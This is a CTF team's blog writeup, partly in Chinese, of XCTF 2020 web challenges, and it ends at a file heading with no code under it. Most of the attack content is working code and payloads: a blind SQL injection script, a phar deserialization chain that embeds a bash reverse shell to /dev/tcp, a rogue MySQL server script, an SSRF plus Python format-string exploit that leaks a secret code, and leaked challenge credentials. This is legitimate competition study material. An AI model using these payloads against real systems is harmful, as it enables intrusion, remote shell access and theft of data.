<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head><meta name="generator" content="Hexo 3.9.0">

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="De1ta-Team">
    

    <!--Author-->
    
        <meta name="author" content="chybeta、pr0ph3t">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="XCTF战疫 2020 Writeup">
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="De1ta">

    <!--Type page-->
    
        <meta property="og:type" content="article">
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary">
    

    <!-- Title -->
    
    <title>XCTF战疫 2020 Writeup - De1ta</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><img src="https://avatars0.githubusercontent.com/u/39492862"></a>
        
        <!-- hacked by chybeta -->
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2020/03/10/XCTF<ZHANYI>-2020/">
                XCTF战疫 2020 Writeup
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2020-03-10</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h1 id="De1ta-Team"><a href="#De1ta-Team" class="headerlink" title=" De1ta-Team"></a> <strong>De1ta-Team</strong></h1><a id="more"></a>
<blockquote>
<p>Team: De1ta</p>
</blockquote>
<p>前排广告位：De1ta长期招 逆向/pwn/密码学/硬件/取证/杂项/etc. 选手，急招二进制和密码选手,有意向的大佬请联系<code>ZGUxdGFAcHJvdG9ubWFpbC5jb20=</code></p>
<p>[toc]</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a>easy_trick_gzmtu</h2><p>传入2020 和Y都能查出结果，传入y20，yy，20y也可以，<br>猜测后端对参数做了date()转换，用\可以使date后的字符串不变，于是构造盲注脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">se = requests.Session()</span><br><span class="line"></span><br><span class="line">pl = <span class="string">r'http://121.37.181.246:6333/?time=0%%27||(\a\s\c\i\i(\s\u\b\s\t\r((\s\e\l\e\c\t%%20\d\a\t\a\b\a\s\e()),%d,1)))=%d%%23'</span></span><br><span class="line">pl = <span class="string">r'http://121.37.181.246:6333/?time=0%%27||(\a\s\c\i\i(\s\u\b\s\t\r((\s\e\l\e\c\t%%20\g\r\o\u\p_\c\o\n\c\a\t(\t\a\b\l\e_\n\a\m\e)%%20\f\r\o\m%%20\i\n\f\o\r\m\a\t\i\o\n_\s\c\h\e\m\a.\t\a\b\l\e\s \w\h\e\r\e \t\a\b\l\e_\s\c\h\e\m\a=\d\a\t\a\b\a\s\e()),%d,1)))=%d%%23'</span></span><br><span class="line">pl = <span class="string">r'http://121.37.181.246:6333/?time=0%%27||(\a\s\c\i\i(\s\u\b\s\t\r((\s\e\l\e\c\t%%20\g\r\o\u\p_\c\o\n\c\a\t(\c\o\l\u\m\n_\n\a\m\e)%%20\f\r\o\m%%20\i\n\f\o\r\m\a\t\i\o\n_\s\c\h\e\m\a.\c\o\l\u\m\n\s%%20\w\h\e\r\e%%20\t\a\b\l\e_\n\a\m\e=%%27\a\d\m\i\n%%27),%d,1)))=%d%%23'</span></span><br><span class="line">pl = <span class="string">r'http://121.37.181.246:6333/?time=0%%27||(\a\s\c\i\i(\s\u\b\s\t\r((\s\e\l\e\c\t%%20\g\r\o\u\p_\c\o\n\c\a\t(\u\r\l)%%20\f\r\o\m%%20\a\d\m\i\n),%d,1)))=%d%%23'</span></span><br><span class="line">text = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">33</span>,<span class="number">126</span>):</span><br><span class="line">                res = se.get(pl % (x,y))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'Hello World --Brian Kernighan'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">                        text += chr(y)</span><br><span class="line">                        <span class="keyword">print</span> text</span><br><span class="line">                        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>注入出一个admin用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账号 admin</span><br><span class="line">密码 20200202goodluck</span><br><span class="line">URL：http://121.37.181.246:6333/eGlhb2xldW5n/</span><br></pre></td></tr></table></figure></p>
<p>有个读文件的地方，限制了只能本地读取文件，发现<code>file://localhost/</code>可以绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.37.181.246:6333/eGlhb2xldW5n/check.php?url=file://localhost/var/www/html/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $gf;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">content_to_file</span><span class="params">($content)</span></span>&#123;	</span><br><span class="line">		$passwd = $_GET[<span class="string">'pass'</span>];</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z]+\.passwd$/m'</span>,$passwd)) </span><br><span class="line">	&#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strpos($passwd,<span class="string">"20200202"</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> file_get_contents(<span class="string">"/"</span>.$content);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		 &#125; </span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aiisc_to_chr</span><span class="params">($number)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(strlen($number)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">		$str = <span class="string">""</span>;</span><br><span class="line">		 $number = str_split($number,<span class="number">2</span>);</span><br><span class="line">		 <span class="keyword">foreach</span> ($number <span class="keyword">as</span> $num ) &#123;</span><br><span class="line">		 	$str = $str .chr($num);</span><br><span class="line">		 &#125;</span><br><span class="line">		 <span class="keyword">return</span> strtolower($str);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> chr($number);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$gf=<span class="keyword">$this</span>-&gt;gf;</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/[a-zA-z0-9]|\&amp;|\^|#|\$|%/'</span>, $gf))&#123;</span><br><span class="line">		  	<span class="keyword">eval</span>(<span class="string">'$content='</span>.$gf.<span class="string">';'</span>);</span><br><span class="line">		  	$content =  <span class="keyword">$this</span>-&gt;aiisc_to_chr($content); </span><br><span class="line">		  	<span class="keyword">return</span> $content;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_to_file(<span class="keyword">$this</span>-&gt;calc());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">unserialize((base64_decode($_GET[<span class="string">'code'</span>])));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>最后反序列化读flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.37.181.246:6333/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php?code=Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czoyMzoifsfJycrHzcvIy8nLycvIyM/IycnKyM4iO30=&amp;pass=a.passwd%0a20200202</span><br></pre></td></tr></table></figure></p>
<h2 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h2><p>有个上传文件的点，和一个连接mysql数据库的点<br>mysql数据库传入的option参数可控，将其设置为8可以开启MYSQLI_OPT_LOCAL_INFILE。<br>但是直接读文件失败了，想到构造phar文件让msyql去读取触发反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$payload=<span class="keyword">new</span> Listfile();</span><br><span class="line">$payload-&gt;file=<span class="string">'$(bash -c "bash -i &gt;&amp; /dev/tcp/ip/1234 0&gt;&amp;1")'</span>;</span><br><span class="line">$file=<span class="keyword">new</span> Fileupload();</span><br><span class="line">$file-&gt;file=$payload;</span><br><span class="line">unlink(<span class="string">"./phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"./phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($file);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($file));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上传之后直接用MysqlRouge触发反序列化即可，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">coding=utf<span class="number">-8</span> </span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"phar:////var/www/html/uploads/846c8ebb95a1fc1828e4fcc14a8902e0/b4bc4fd46f0e346f2bd105c93c5a1b20.jpg"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3309</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=ip:port&amp;user=user&amp;password=passsword&amp;option=8</span><br></pre></td></tr></table></figure>
<p>最后/readflag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：flag&#123;bfa7ea9865f08c320abab5323a1b522c1&#125;</span><br></pre></td></tr></table></figure>
<h2 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h2><p>审计代码可以构造SSRF<br><a href="http://121.37.179.47:1101/?head=\&amp;url=xxx.xxx.xxx.xxx" target="_blank" rel="noopener">http://121.37.179.47:1101/?head=\&amp;url=xxx.xxx.xxx.xxx</a></p>
<p>发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extract($_GET);</span><br><span class="line">echo sprintf($begin.&apos;%d&apos;,$output);</span><br></pre></td></tr></table></figure>
<p>传入<code>begin=%s%</code>，可以读到output，于是得到有回显SSRF<br>扫描内网发现8080端口开放<br><img src="https://i.loli.net/2020/03/10/rh1qIpfPWKsXB4U.png" alt="fmkq1.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=http://localhost:8080/read/file=/etc/passwd%26vipcode%3d0&amp;head=\&amp;begin=%s%</span><br></pre></td></tr></table></figure>
<p>通过这个接口自带的列目录功能可以发现flag在</p>
<p>但是不能直接读<br>但是如果file参数传入{file}时会被解析成error，尝试{file.<strong>class</strong>}之后确定后端为python且存在格式化字符串漏洞</p>
<p>存用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=http://localhost:8080/read/file=&#123;file.__class__.__init__.__globals__[vip].__init__.__globals__&#125;%26vipcode=&#123;file&#125;&amp;head=\&amp;begin=%s%</span><br></pre></td></tr></table></figure>
<p>可读取到vipcode的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;vipcode&apos;: &apos;uJvFXyqiHnztNQBU10TYkepKjAh7xVMfmgdS4G9r5sWa6loL</span><br></pre></td></tr></table></figure>
<p>有了vipcode可以读取源码和列目录，知道flag在<code>/fl4g_1s_h3re_u_wi11_rua</code>里，但是读不了，于是读取项目代码，如下：</p>
<p>/app/base/readfile.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .vip <span class="keyword">import</span> vip</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,file)</span>:</span></span><br><span class="line">        self.file = file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">readfile</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        filename = self.GetFileName()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'..'</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">'proc'</span> <span class="keyword">in</span> filename:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"quanbumuda"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                file = open(<span class="string">"/tmp/"</span> + filename, <span class="string">'r'</span>)</span><br><span class="line">                content = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">                <span class="keyword">return</span> content</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">r'file=.*?&amp;vipcode=.*?'</span>,data) != <span class="keyword">None</span>:</span><br><span class="line">            data = data.split(<span class="string">'&amp;'</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>],</span><br><span class="line">                data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.file = File(data[<span class="string">'file'</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'vipcode'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.vipcode = data[<span class="string">'vipcode'</span>]</span><br><span class="line">            self.vip = vip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vipcode'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vip'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isvip</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.vipcode == self.vip.GetCode():</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetFileName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file.GetName()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_folder_file = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vipreadfile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,readfile)</span>:</span></span><br><span class="line">        self.filename = readfile.GetFileName()</span><br><span class="line">        self.path = os.path.dirname(os.path.abspath(self.filename))</span><br><span class="line">        self.file = File(os.path.basename(os.path.abspath(self.filename)))</span><br><span class="line">        <span class="keyword">global</span> current_folder_file</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            current_folder_file = os.listdir(self.path)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            current_folder_file = current_folder_file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fl4g'</span> <span class="keyword">in</span> self.path:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'nonono,this folder is a secret!!!'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">'''Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n'''</span></span><br><span class="line">            filepath = (self.path + <span class="string">'/&#123;vipfile&#125;'</span>).format(vipfile=self.file)</span><br><span class="line">            output += filepath</span><br><span class="line">            output += <span class="string">'\r\n\r\nThe content is:\r\n'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = open(filepath,<span class="string">'r'</span>)</span><br><span class="line">                content = f.read()</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                content = <span class="string">'can\'t read'</span></span><br><span class="line">            output += content</span><br><span class="line">            output += <span class="string">'\r\n\r\nOther files under the same folder:\r\n'</span></span><br><span class="line">            output += <span class="string">' '</span>.join(current_folder_file)</span><br><span class="line">            <span class="keyword">return</span> output</span><br><span class="line">```     </span><br><span class="line"></span><br><span class="line">/app/base/vip.py</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vipcode = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vip</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> vipcode</span><br><span class="line">        <span class="keyword">if</span> vipcode == <span class="string">''</span>:</span><br><span class="line">            vipcode = <span class="string">''</span>.join(random.sample(string.ascii_letters+string.digits, <span class="number">48</span>))</span><br><span class="line">            self.truevipcode = vipcode</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.truevipcode = vipcode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.truevipcode</span><br></pre></td></tr></table></figure>
<p>/app/app.py</p>
